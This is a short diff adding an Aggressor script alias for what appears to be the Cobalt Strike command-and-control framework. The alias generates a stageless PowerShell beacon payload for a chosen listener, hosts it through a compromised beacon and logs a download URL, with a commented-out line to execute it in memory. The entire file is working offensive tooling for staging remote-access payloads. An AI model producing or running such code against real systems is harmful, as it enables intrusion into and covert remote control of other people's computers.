@@ -1,0 +1,18 @@
+alias host_script {
+	local('$bid $script $hosted');
+
+	$bid = $1;
+	$listener = $2;
+
+	# generate payload
+	artifact_stageless($listener, 'powershell', 'x86', $null, $this);
+	yield;
+
+	# this function is now resumed after &artifact_stageless finished. $1 is our script.
+	$script = $1;
+
+	$hosted = beacon_host_script($1, $script);
+
+	blog($bid, "to download: " . $hosted);
+	#bpowerpick($1, $hosted);
+}
